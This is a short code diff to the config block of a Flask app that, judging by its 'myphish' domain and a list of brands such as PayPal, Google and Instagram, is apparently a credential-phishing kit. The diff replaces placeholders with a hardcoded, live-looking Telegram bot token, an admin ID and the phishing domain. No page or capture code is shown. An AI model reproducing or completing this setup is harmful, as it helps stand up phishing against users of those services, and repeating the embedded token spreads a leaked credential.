@@ -8,9 +8,9 @@ import re
 app = Flask(__name__)
 
 # Config
-BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN')
-ADMIN_ID = int(os.getenv('ADMIN_ID', '123456789'))
-DOMAIN = os.getenv('DOMAIN', 'https://yourapp.onrender.com')
+BOT_TOKEN = os.getenv('BOT_TOKEN', '8232409100:AAExUp0yXjQzN7js3bQriSKq5MiOClU3BeU')
+ADMIN_ID = int(os.getenv('ADMIN_ID', '6593129349'))
+DOMAIN = os.getenv('DOMAIN', 'https://myphish.onrender.com')
 DATA_FILE = 'data.json'
 
 SERVICES = ['instagram', 'google', 'facebook', 'snapchat', 'spotify', 'netflix', 'paypal', 'amazon', 'discord', 'roblox', 'github']
